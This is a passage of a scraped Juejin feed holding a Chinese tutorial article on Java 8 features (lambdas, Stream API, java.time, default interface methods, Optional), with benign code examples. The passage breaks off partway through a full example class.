</li>
<li>
<p>事件 = 观察者</p>
</li>
<li>
<p><code>@Bean</code> = 策略注册</p>
</li>
</ul>
</li>
</ol>
<p>“好的代码，不是写出来的，而是‘隔离’出来的。”</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让JDK 8成就Web神话的核心特性]]></title>    <link>https://juejin.cn/post/7605810996125515810</link>    <guid>https://juejin.cn/post/7605810996125515810</guid>    <pubDate>2026-02-13T05:45:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605810996125515810" data-draft-id="7605542907119386676" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让JDK 8成就Web神话的核心特性"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-13T05:45:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="日月云棠"/> <meta itemprop="url" content="https://juejin.cn/user/420442283981488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让JDK 8成就Web神话的核心特性
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/420442283981488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    日月云棠
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T05:45:19.000Z" title="Fri Feb 13 2026 05:45:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JDK 8 特性详解</h2>
<h3 data-id="heading-1">1. 概述</h3>
<p>JDK 8（2014年3月发布）是Java历史上最重要的版本之一，引入了大量革命性的特性，彻底改变了Java的编程方式。这些特性不仅使代码更简洁、更易读，还显著提升了性能和开发效率。</p>
<h3 data-id="heading-2">2. 核心特性详解</h3>
<h4 data-id="heading-3">2.1 Lambda表达式</h4>
<p><strong>特性说明：</strong></p>
<ul>
<li>Lambda表达式允许将函数作为方法参数传递，支持函数式编程风格</li>
<li>减少了匿名内部类的模板代码，使代码更简洁</li>
<li>编译时生成 <code>invokedynamic</code> 指令，比匿名内部类更高效</li>
</ul>
<p><strong>语法格式：</strong></p>
<pre><code class="hljs language-java" lang="java">(参数列表) -&gt; 表达式或代码块
</code></pre>
<p><strong>代码示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 传统方式 - 匿名内部类</span>
<span class="hljs-type">Runnable</span> <span class="hljs-variable">traditionalRunnable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"传统方式执行"</span>);
    }
};

<span class="hljs-comment">// Lambda方式 - 更简洁</span>
<span class="hljs-type">Runnable</span> <span class="hljs-variable">lambdaRunnable</span> <span class="hljs-operator">=</span> () -&gt; System.out.println(<span class="hljs-string">"Lambda方式执行"</span>);

<span class="hljs-comment">// 执行</span>
traditionalRunnable.run();  <span class="hljs-comment">// 输出: 传统方式执行</span>
lambdaRunnable.run();       <span class="hljs-comment">// 输出: Lambda方式执行</span>

<span class="hljs-comment">// 集合排序的Lambda应用</span>
List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">"张三"</span>, <span class="hljs-string">"李四"</span>, <span class="hljs-string">"王五"</span>, <span class="hljs-string">"赵六"</span>);

<span class="hljs-comment">// Lambda排序方式</span>
Collections.sort(names, (a, b) -&gt; a.compareTo(b));

<span class="hljs-comment">// 更简洁的方法引用</span>
Collections.sort(names, String::compareTo);
</code></pre>
<p><strong>性能优势：</strong></p>
<ul>
<li>避免了匿名内部类的对象创建开销</li>
<li>减少了字节码大小</li>
<li>运行时通过 <code>invokedynamic</code> 指令动态链接，执行效率更高</li>
<li>内存占用更小，垃圾回收压力减轻</li>
</ul>
<p><strong>适用场景：</strong></p>
<ul>
<li>事件处理</li>
<li>集合操作</li>
<li>函数式接口实现</li>
<li>并行处理</li>
</ul>
<h4 data-id="heading-4">2.2 Stream API</h4>
<p><strong>特性说明：</strong></p>
<ul>
<li>支持链式操作的函数式数据处理</li>
<li>提供了丰富的中间操作和终端操作</li>
<li>支持串行和并行处理</li>
<li>延迟执行，只有在终端操作时才会真正执行</li>
</ul>
<p><strong>核心操作类型：</strong></p>
<ul>
<li><strong>中间操作</strong>：返回Stream，可链式调用（如filter、map、sorted）</li>
<li><strong>终端操作</strong>：返回非Stream结果，触发实际执行（如collect、forEach、reduce）</li>
</ul>
<p><strong>代码示例：</strong></p>
<pre><code class="hljs language-java" lang="java">List&lt;Integer&gt; numbers = Arrays.asList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>);

<span class="hljs-comment">// Stream方式：筛选偶数并计算平方</span>
List&lt;Integer&gt; resultStream = numbers.stream()
        .filter(n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)      <span class="hljs-comment">// 过滤偶数</span>
        .map(n -&gt; n * n)              <span class="hljs-comment">// 计算平方</span>
        .collect(Collectors.toList()); <span class="hljs-comment">// 收集结果</span>

System.out.println(<span class="hljs-string">"Stream方式结果: "</span> + resultStream); <span class="hljs-comment">// 输出: [4, 16, 36, 64, 100]</span>

<span class="hljs-comment">// 统计操作</span>
<span class="hljs-type">IntSummaryStatistics</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> numbers.stream()
        .mapToInt(Integer::intValue)
        .summaryStatistics();

System.out.println(<span class="hljs-string">"统计信息: "</span> + stats);
System.out.println(<span class="hljs-string">"平均值: "</span> + stats.getAverage());
System.out.println(<span class="hljs-string">"最大值: "</span> + stats.getMax());

<span class="hljs-comment">// 分组操作</span>
Map&lt;String, List&lt;Integer&gt;&gt; grouped = numbers.stream()
        .collect(Collectors.groupingBy(
                n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> ? <span class="hljs-string">"偶数"</span> : <span class="hljs-string">"奇数"</span>
        ));

System.out.println(<span class="hljs-string">"分组结果: "</span> + grouped); <span class="hljs-comment">// 输出: {奇数=[1, 3, 5, 7, 9], 偶数=[2, 4, 6, 8, 10]}</span>
</code></pre>
<p><strong>并行流处理：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 并行流处理</span>
List&lt;Integer&gt; parallelResult = numbers.parallelStream()
        .filter(n -&gt; n &gt; <span class="hljs-number">5</span>)
        .map(n -&gt; n * <span class="hljs-number">2</span>)
        .sorted()
        .collect(Collectors.toList());

System.out.println(<span class="hljs-string">"并行处理结果: "</span> + parallelResult); <span class="hljs-comment">// 输出: [12, 14, 16, 18, 20]</span>
</code></pre>
<p><strong>性能优势：</strong></p>
<ul>
<li>并行流自动利用ForkJoinPool，充分发挥多核CPU性能</li>
<li>惰性计算减少了不必要的中间结果存储</li>
<li>内部迭代比外部迭代更高效，减少了循环开销</li>
<li>优化的流水线处理，减少了内存访问</li>
<li>对于大数据集，并行处理可显著提升性能</li>
</ul>
<p><strong>适用场景：</strong></p>
<ul>
<li>大数据集处理</li>
<li>复杂的数据转换和过滤</li>
<li>统计分析</li>
<li>并行计算</li>
</ul>
<h4 data-id="heading-5">2.3 新日期时间API</h4>
<p><strong>特性说明：</strong></p>
<ul>
<li>基于ISO-8601标准设计</li>
<li>所有类都是不可变的，线程安全</li>
<li>清晰的API设计，区分日期、时间、日期时间、时区等概念</li>
<li>支持流畅的方法链调用</li>
</ul>
<p><strong>核心类：</strong></p>
<ul>
<li><code>LocalDate</code>：表示日期（年、月、日）</li>
<li><code>LocalTime</code>：表示时间（时、分、秒、纳秒）</li>
<li><code>LocalDateTime</code>：表示日期时间</li>
<li><code>ZonedDateTime</code>：表示带时区的日期时间</li>
<li><code>Duration</code>：表示时间间隔</li>
<li><code>Period</code>：表示日期间隔</li>
<li><code>DateTimeFormatter</code>：日期时间格式化</li>
</ul>
<p><strong>代码示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 新版日期时间API</span>
<span class="hljs-type">LocalDate</span> <span class="hljs-variable">currentDate</span> <span class="hljs-operator">=</span> LocalDate.now();
<span class="hljs-type">LocalTime</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> LocalTime.now();
<span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">currentDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.now();

System.out.println(<span class="hljs-string">"当前日期: "</span> + currentDate);
System.out.println(<span class="hljs-string">"当前时间: "</span> + currentTime);
System.out.println(<span class="hljs-string">"当前日期时间: "</span> + currentDateTime);

<span class="hljs-comment">// 日期操作</span>
<span class="hljs-type">LocalDate</span> <span class="hljs-variable">tomorrow</span> <span class="hljs-operator">=</span> currentDate.plusDays(<span class="hljs-number">1</span>);
<span class="hljs-type">LocalDate</span> <span class="hljs-variable">nextWeek</span> <span class="hljs-operator">=</span> currentDate.plusWeeks(<span class="hljs-number">1</span>);
<span class="hljs-type">LocalDate</span> <span class="hljs-variable">nextMonth</span> <span class="hljs-operator">=</span> currentDate.plusMonths(<span class="hljs-number">1</span>);

System.out.println(<span class="hljs-string">"明天: "</span> + tomorrow);
System.out.println(<span class="hljs-string">"下周: "</span> + nextWeek);
System.out.println(<span class="hljs-string">"下月: "</span> + nextMonth);

<span class="hljs-comment">// 日期比较</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">isBefore</span> <span class="hljs-operator">=</span> tomorrow.isBefore(nextWeek);
System.out.println(<span class="hljs-string">"明天是否在下周之前: "</span> + isBefore); <span class="hljs-comment">// 输出: true</span>

<span class="hljs-comment">// 日期格式化</span>
<span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">formatted</span> <span class="hljs-operator">=</span> currentDateTime.format(formatter);
System.out.println(<span class="hljs-string">"格式化日期: "</span> + formatted);

<span class="hljs-comment">// 时区处理</span>
<span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">zonedDateTime</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">"America/New_York"</span>));
System.out.println(<span class="hljs-string">"纽约时间: "</span> + zonedDateTime);

<span class="hljs-comment">// 持续时间计算</span>
<span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> LocalDateTime.of(<span class="hljs-number">2024</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
<span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> LocalDateTime.now();
<span class="hljs-type">Duration</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> Duration.between(start, end);
System.out.println(<span class="hljs-string">"从2024年开始已经过去了: "</span> + duration.toDays() + <span class="hljs-string">" 天"</span>);
</code></pre>
<p><strong>性能优势：</strong></p>
<ul>
<li>不可变设计避免了线程同步开销</li>
<li>比旧版Date/Calendar更高效，减少了对象创建</li>
<li>优化的格式化和解析算法</li>
<li>时区处理更高效，基于IANA时区数据库</li>
<li>清晰的API设计减少了错误使用</li>
</ul>
<p><strong>适用场景：</strong></p>
<ul>
<li>日期时间计算和比较</li>
<li>时区转换</li>
<li>日期时间格式化和解析</li>
<li>时间间隔计算</li>
</ul>
<h4 data-id="heading-6">2.4 接口默认方法和静态方法</h4>
<p><strong>特性说明：</strong></p>
<ul>
<li>允许接口中包含带有实现的默认方法</li>
<li>支持接口演进，不破坏现有实现类</li>
<li>接口中可以定义静态方法</li>
</ul>
<p><strong>语法格式：</strong></p>
<pre><code class="hljs language-java" lang="java">interface 接口名 {
    <span class="hljs-comment">// 抽象方法</span>
    返回类型 方法名(参数列表);
    
    <span class="hljs-comment">// 默认方法</span>
    <span class="hljs-keyword">default</span> 返回类型 方法名(参数列表) {
        <span class="hljs-comment">// 实现</span>
    }
    
    <span class="hljs-comment">// 静态方法</span>
    <span class="hljs-keyword">static</span> 返回类型 方法名(参数列表) {
        <span class="hljs-comment">// 实现</span>
    }
}
</code></pre>
<p><strong>代码示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 接口默认方法示例</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>;
    <span class="hljs-type">int</span> <span class="hljs-title function_">subtract</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>;

    <span class="hljs-comment">// 默认方法 - 接口可以提供实现</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">int</span> <span class="hljs-title function_">multiply</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a * b;
    }

    <span class="hljs-comment">// 另一个默认方法</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">int</span> <span class="hljs-title function_">square</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> {
        <span class="hljs-keyword">return</span> multiply(a, a);
    }

    <span class="hljs-comment">// 静态方法 - 接口中的工具方法</span>
    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getVersion</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Calculator v1.0"</span>;
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicCalculator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a + b;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">subtract</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a - b;
    }

    <span class="hljs-comment">// 不需要实现默认方法，可以直接使用</span>
    <span class="hljs-comment">// 也可以选择重写默认方法</span>
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-type">Calculator</span> <span class="hljs-variable">calculator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BasicCalculator</span>();
System.out.println(<span class="hljs-string">"加法: "</span> + calculator.add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
System.out.println(<span class="hljs-string">"减法: "</span> + calculator.subtract(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
System.out.println(<span class="hljs-string">"乘法: "</span> + calculator.multiply(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
System.out.println(<span class="hljs-string">"默认方法平方: "</span> + calculator.square(<span class="hljs-number">5</span>));
System.out.println(<span class="hljs-string">"静态方法版本: "</span> + Calculator.getVersion());
</code></pre>
<p><strong>性能优势：</strong></p>
<ul>
<li>避免了为扩展功能而创建的适配器类</li>
<li>减少了类层次结构的复杂性</li>
<li>默认方法通过invokespecial指令调用，执行效率高</li>
<li>接口演进更加灵活，不破坏现有代码</li>
</ul>
<p><strong>适用场景：</strong></p>
<ul>
<li>接口扩展</li>
<li>函数式接口增强</li>
<li>工具方法定义</li>
<li>框架设计</li>
</ul>
<h4 data-id="heading-7">2.5 其他重要特性</h4>
<h5 data-id="heading-8">2.5.1 Optional类</h5>
<ul>
<li>优雅处理null值，减少空指针异常</li>
<li>提供了丰富的方法链操作</li>
<li>使代码更清晰，表达意图更明确</li>
</ul>
<h5 data-id="heading-9">2.5.2 方法引用</h5>
<ul>
<li>简化Lambda表达式，使代码更简洁</li>
<li>支持静态方法、实例方法和构造方法引用</li>
<li>提高代码可读性</li>
</ul>
<h5 data-id="heading-10">2.5.3 类型注解</h5>
<ul>
<li>支持在更多位置使用注解</li>
<li>增强了静态代码分析能力</li>
<li>提高了代码安全性</li>
</ul>
<h3 data-id="heading-11">3. 性能提升总结</h3>



































<table><thead><tr><th>特性</th><th>性能提升</th><th>适用场景</th></tr></thead><tbody><tr><td>Lambda表达式</td><td>减少对象创建开销，执行效率更高</td><td>事件处理、集合操作</td></tr><tr><td>Stream API</td><td>并行处理利用多核CPU，惰性计算减少内存使用</td><td>大数据集处理、统计分析</td></tr><tr><td>新日期时间API</td><td>不可变设计避免线程同步开销，更高效的实现</td><td>日期时间处理、时区转换</td></tr><tr><td>接口默认方法</td><td>减少适配器类，执行效率高</td><td>接口扩展、框架设计</td></tr><tr><td>并行流</td><td>自动利用多核处理器，显著提升大数据处理速度</td><td>CPU密集型任务、大规模数据处理</td></tr></tbody></table>
<h3 data-id="heading-12">4. 最佳实践</h3>
<h4 data-id="heading-13">4.1 Lambda表达式使用建议</h4>
<ul>
<li>保持Lambda体简洁，避免复杂逻辑</li>
<li>优先使用方法引用提高可读性</li>
<li>注意变量作用域，避免修改外部变量</li>
</ul>
<h4 data-id="heading-14">4.2 Stream API使用建议</h4>
<ul>
<li>对于小数据集，使用串行流即可</li>
<li>对于大数据集（ thousands+ 元素），考虑使用并行流</li>
<li>避免在并行流中使用状态ful操作</li>
<li>合理使用中间操作减少数据量</li>
</ul>
<h4 data-id="heading-15">4.3 日期时间API使用建议</h4>
<ul>
<li>根据需要选择合适的日期时间类</li>
<li>使用不可变的日期时间对象</li>
<li>优先使用DateTimeFormatter进行格式化</li>
<li>注意时区处理的正确性</li>
</ul>
<h3 data-id="heading-16">5. 代码示例</h3>
<h4 data-id="heading-17">5.1 完整示例类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.java.learning;

<span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.format.DateTimeFormatter;
<span class="hljs-keyword">import</span> java.util.*;
<span class="hljs-keyword">import</span> java.util.stream.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDK8Features</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        demonstrateLambda();
        demonstrateStreamAPI();
        demonstrateDateTimeAPI();
        demonstrateDefaultMethods();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateLambda</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"=== Lambda表达式示例 ==="</span>);

        <span class="hljs-comment">// 传统方式 - 匿名内部类</span>
        <span class="hljs-type">Runnable</span> <span class="hljs-variable">traditionalRunnable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                System.out.println(<span class="hljs-string">"传统方式执行"</span>);
            }
        };

        <span class="hljs-comment">// Lambda方式 - 更简洁</span>
        <span class="hljs-type">Runnable</span> <span class="hljs-variable">lambdaRunnable</span> <span class="hljs-operator">=</span> () -&gt; System.out.println(<span class="hljs-string">"Lambda方式执行"</span>);

        <span class="hljs-comment">// 执行</span>
        traditionalRunnable.run();
        lambdaRunnable.run();

        <span class="hljs-comment">// 集合排序的Lambda应用</span>
        List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">"张三"</span>, <span class="hljs-string">"李四"</span>, <span class="hljs-string">"王五"</span>, <span class="hljs-string">"赵六"</span>);

        <span class="hljs-comment">// 传统排序方式</span>
        Collections.sort(names, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;String&gt;() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(String a, String b)</span> {
                <span class="hljs-keyword">return</span> a.compareTo(b);
            }
        });

        <span class="hljs-comment">// Lambda排序方式</span>
        Collections.sort(names, (a, b) -&gt; a.compareTo(b));

        <span class="hljs-comment">// 更简洁的方法引用</span>
        Collections.sort(names, String::compareTo);

        System.out.println(<span class="hljs-string">"排序后的名字: "</span> + names);

        <span class="hljs-comment">// 事件处理中的Lambda</span>
        javax.swing.<span class="hljs-type">JButton</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.swing.JButton(<span class="hljs-string">"测试按钮"</span>);
        button.addActionListener(e -&gt; System.out.println(<span class="hljs-string">"按钮被点击了!"</span>));
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateStreamAPI</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"\n=== Stream API示例 ==="</span>);

        List&lt;Integer&gt; numbers = Arrays.asList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>);

        <span class="hljs-comment">// 传统方式：筛选偶数并计算平方</span>
        List&lt;Integer&gt; resultTraditional = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">for</span> (Integer num : numbers) {
            <span class="hljs-keyword">if</span> (num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) {
                resultTraditional.add(num * num);
            }
        }

        <span class="hljs-comment">// Stream方式：更声明式、更简洁</span>
        List&lt;Integer&gt; resultStream = numbers.stream()
                .filter(n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)      <span class="hljs-comment">// 过滤偶数</span>
                .map(n -&gt; n * n)              <span class="hljs-comment">// 计算平方</span>
                .collect(Collectors.toList()); <span class="hljs-comment">// 收集结果</span>

        System.out.println(<span class="hljs-string">"传统方式结果: "</span> + resultTraditional);
        System.out.println(<span class="hljs-string">"Stream方式结果: "</span> + resultStream);

        <span class="hljs-comment">// 更多Stream操作</span>
        System.out.println(<span class="hljs-string">"\n--- 更多Stream操作 ---"</span>);

        <span class="hljs-comment">// 统计操作</span>
        <span class="hljs-type">IntSummaryStatistics</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> numbers.stream()
                .mapToInt(Integer::intValue)
                .summaryStatistics();

        System.out.println(<span class="hljs-string">"统计信息: "</span> + stats);
        System.out.println(<span class="hljs-string">"平均值: "</span> + stats.getAverage());
        System.out.println(<span class="hljs-string">"最大值: "</span> + stats.getMax());

        <span class="hljs-comment">// 分组操作</span>
        Map&lt;String, List&lt;Integer&gt;&gt; grouped = numbers.stream()
                .collect(Collectors.groupingBy(
                        n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> ? <span class="hljs-string">"偶数"</span> : <span class="hljs-string">"奇数"</span>
                ));

        System.out.println(<span class="hljs-string">"分组结果: "</span> + grouped);

        <span class="hljs-comment">// 并行流处理</span>
